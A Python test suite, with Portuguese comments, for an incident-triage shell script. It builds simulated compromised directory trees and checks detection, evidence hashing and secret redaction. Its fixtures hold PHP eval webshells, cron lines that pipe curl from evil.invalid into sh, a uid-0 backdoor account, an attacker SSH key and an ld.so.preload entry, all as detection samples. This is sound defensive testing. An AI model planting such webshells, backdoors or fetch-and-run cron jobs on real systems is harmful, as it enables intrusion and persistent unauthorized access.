"""Testes do coletor de incidente (ir_triage.sh).

Cobrem o critério de aceitação do Lote 3:
- árvore com webshell plantada é detectada;
- árvore íntegra roda limpa;
- evidência é hasheada antes de qualquer ação;
- o coletor não vaza segredo no relatório.

Todos os testes usam --root, então não leem o host real.
"""

from __future__ import annotations

import hashlib
import json
import os
import subprocess
import tempfile
import time
import unittest
from pathlib import Path

SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "ir_triage.sh"
OLD = time.time() - 30 * 86400


def write(path: Path, content: str | bytes, mode: int | None = None, mtime: float | None = None) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(content, bytes):
        path.write_bytes(content)
    else:
        path.write_text(content, encoding="utf-8")
    if mode is not None:
        path.chmod(mode)
    if mtime is not None:
        os.utime(path, (mtime, mtime))


def run(root: Path, *args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [str(SCRIPT), "--root", str(root), *args],
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )


def build_clean(root: Path) -> None:
    write(root / "var/www/html/index.php", "<?php echo 'ok'; ?>\n")
    write(root / "etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n", mtime=OLD)
    write(root / "etc/passwd", "root:x:0:0:root:/root:/bin/bash\nusuario:x:1000:1000::/home/usuario:/bin/bash\n", mtime=OLD)
    write(root / "etc/sudoers", "root ALL=(ALL:ALL) ALL\n", mtime=OLD)
    write(root / "var/log/auth.log", "ok\n")
    (root / "etc/cron.d").mkdir(parents=True, exist_ok=True)
    (root / "root/.ssh").mkdir(parents=True, exist_ok=True)


def build_compromised(root: Path) -> None:
    webshell = root / "var/www/html/uploads/foto.php.jpg"
    write(webshell, '<?php eval(base64_decode($_POST["x"])); ?>\n')
    write(root / "etc/ld.so.preload", "/tmp/lib.so\n")
    write(root / "etc/cron.d/evil", "* * * * * root curl -s http://evil.invalid/x.sh | sh\n")
    write(root / "root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample attacker@evil\n")
    write(root / "tmp/xmrig", b"\x7fELF\x02\x01\x01\x00fake miner\n", mode=0o755)
    write(root / "etc/passwd", "root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/bash\n")
    write(root / "etc/sudoers", "root ALL=(ALL:ALL) ALL\n", mtime=OLD)
    write(root / "var/log/auth.log", "ok\n")


class IrTriageTest(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="gaara-ir-test-"))
        self.addCleanup(lambda: subprocess.run(["rm", "-rf", str(self.tmp)], check=False))

    def _compromised(self) -> Path:
        root = self.tmp / "comprometido"
        build_compromised(root)
        return root

    def _clean(self) -> Path:
        root = self.tmp / "limpo"
        build_clean(root)
        return root

    def _json(self, root: Path) -> tuple[dict, subprocess.CompletedProcess[str]]:
        proc = run(root)
        self.assertNotEqual(proc.returncode, 1, proc.stderr)
        return json.loads(proc.stdout), proc

    def test_compromised_tree_is_detected(self) -> None:
        root = self._compromised()
        result, proc = self._json(root)
        self.assertEqual(proc.returncode, 3, proc.stderr)
        self.assertEqual(result["summary"]["verdict"], "incidente")
        categories = {f["category"] for f in result["findings"]}
        self.assertIn("detection/upload-webshell", categories)
        self.assertIn("ir/persistence", categories)
        self.assertIn("detection/cryptomining", categories)

    def test_webshell_evidence_is_hashed(self) -> None:
        root = self._compromised()
        result, _ = self._json(root)
        webshell = root / "var/www/html/uploads/foto.php.jpg"
        digest = hashlib.sha256(webshell.read_bytes()).hexdigest()
        finding = next(f for f in result["findings"] if f["category"] == "detection/upload-webshell")
        self.assertEqual(finding["severity"], "critico")
        self.assertIn(digest, finding["evidence"][0]["locator"])
        manifest = {a["path"]: a["sha256"] for a in result["scan"]["artifacts"]}
        self.assertEqual(manifest[str(webshell)], digest)

    def test_clean_tree_is_clean(self) -> None:
        root = self._clean()
        result, proc = self._json(root)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(result["summary"]["verdict"], "estavel")
        self.assertEqual(result["findings"], [])

    def test_root_mode_disables_live_checks(self) -> None:
        root = self._clean()
        result, _ = self._json(root)
        self.assertNotIn("processos", result["scan"]["sources"])
        self.assertNotIn("rede", result["scan"]["sources"])
        self.assertTrue(any("--root" in note for note in result["summary"]["not_observed"]))

    def test_output_writes_manifest(self) -> None:
        root = self._compromised()
        out = self.tmp / "relatorio.json"
        proc = run(root, "--output", str(out))
        self.assertEqual(proc.returncode, 3, proc.stderr)
        self.assertTrue(out.is_file())
        manifest = Path(str(out) + ".sha256")
        self.assertTrue(manifest.is_file())
        result = json.loads(out.read_text(encoding="utf-8"))
        paths = [a["path"] for a in result["scan"]["artifacts"]]
        self.assertEqual(len(paths), len(set(paths)), "artefatos duplicados no manifesto")
        for line in manifest.read_text(encoding="utf-8").splitlines():
            digest, path = line.split("  ")
            self.assertEqual(digest, hashlib.sha256(Path(path).read_bytes()).hexdigest())

    def test_secret_is_redacted(self) -> None:
        root = self._compromised()
        write(
            root / "etc/cron.d/leak",
            '* * * * * root curl --token SUPERSECRET123 -H "Authorization: Bearer TOPSECRET456" http://x.invalid/a | sh\n',
        )
        result, proc = self._json(root)
        self.assertNotIn("SUPERSECRET123", proc.stdout)
        self.assertNotIn("TOPSECRET456", proc.stdout)
        cron = [f for f in result["findings"] if "Tarefa agendada" in f["title"]]
        self.assertTrue(cron)
        for finding in cron:
            self.assertTrue(finding["evidence"][0]["redacted"])

    def test_deterministic_findings(self) -> None:
        root = self._compromised()
        first, _ = self._json(root)
        second, _ = self._json(root)
        self.assertEqual(first["findings"], second["findings"])

    def test_vendor_with_old_eval_is_not_reported(self) -> None:
        root = self._clean()
        write(
            root / "var/www/html/vendor/lib.php",
            '<?php eval(base64_decode("ZWNobyAxOw==")); ?>\n',
            mtime=OLD,
        )
        result, proc = self._json(root)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(result["findings"], [])

    def test_recent_vendor_eval_is_not_reported(self) -> None:
        root = self._clean()
        write(root / "var/www/html/vendor/lib.php", '<?php eval(base64_decode("ZWNobyAxOw==")); ?>\n')
        result, proc = self._json(root)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertFalse([f for f in result["findings"] if "webshell" in f["title"].lower()])

    def test_shared_memory_blob_is_not_reported(self) -> None:
        root = self._clean()
        write(root / "dev/shm/ad_qipcshm_1_1", b"\x00" * 64, mode=0o700)
        result, proc = self._json(root)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(result["findings"], [])

    def test_temp_script_is_reported(self) -> None:
        root = self._clean()
        write(root / "tmp/dropper", "#!/bin/sh\necho x\n", mode=0o755)
        result, proc = self._json(root)
        self.assertEqual(proc.returncode, 0, proc.stderr)  # médio não eleva o veredito
        titles = [f["title"] for f in result["findings"]]
        self.assertIn("Executável em diretório temporário", titles)

    def test_double_extension_without_payload_is_reported(self) -> None:
        root = self._clean()
        write(root / "var/www/html/uploads/foto.php.jpg", "apenas texto\n")
        result, proc = self._json(root)
        self.assertEqual(proc.returncode, 3, proc.stderr)
        self.assertTrue(any(f["category"] == "detection/upload-webshell" for f in result["findings"]))

    def test_eval_post_webshell_is_reported(self) -> None:
        root = self._clean()
        write(root / "var/www/html/uploads/x.php", '<?php @eval($_POST["x"]); ?>\n')
        result, proc = self._json(root)
        self.assertEqual(proc.returncode, 3, proc.stderr)
        self.assertTrue(any(f["category"] == "detection/upload-webshell" for f in result["findings"]))

    def test_webroot_is_resolved_inside_root(self) -> None:
        root = self._clean()
        write(root / "opt/app/uploads/x.php", '<?php eval($_POST["x"]); ?>\n')
        proc = run(root, "--webroot", "/opt/app")
        self.assertEqual(proc.returncode, 3, proc.stderr)
        result = json.loads(proc.stdout)
        self.assertTrue(any(f["category"] == "detection/upload-webshell" for f in result["findings"]))

    def test_unknown_format_is_usage_error(self) -> None:
        proc = run(self._clean(), "--format", "xml")
        self.assertEqual(proc.returncode, 2)

    def test_redact_off_requires_reason(self) -> None:
        proc = run(self._clean(), "--redact", "off")
        self.assertEqual(proc.returncode, 2)
        self.assertIn("--redact-off-reason", proc.stderr)

    def test_redact_off_marks_evidence_unredacted(self) -> None:
        root = self._compromised()
        proc = run(root, "--redact", "off", "--redact-off-reason", "perícia autorizada")
        self.assertEqual(proc.returncode, 3, proc.stderr)
        result = json.loads(proc.stdout)
        self.assertTrue(result["findings"])
        for finding in result["findings"]:
            self.assertFalse(finding["evidence"][0]["redacted"])

    def test_missing_root_is_error(self) -> None:
        proc = subprocess.run(
            [str(SCRIPT), "--root", str(self.tmp / "nao-existe")],
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )
        self.assertEqual(proc.returncode, 1)


if __name__ == "__main__":
    unittest.main()
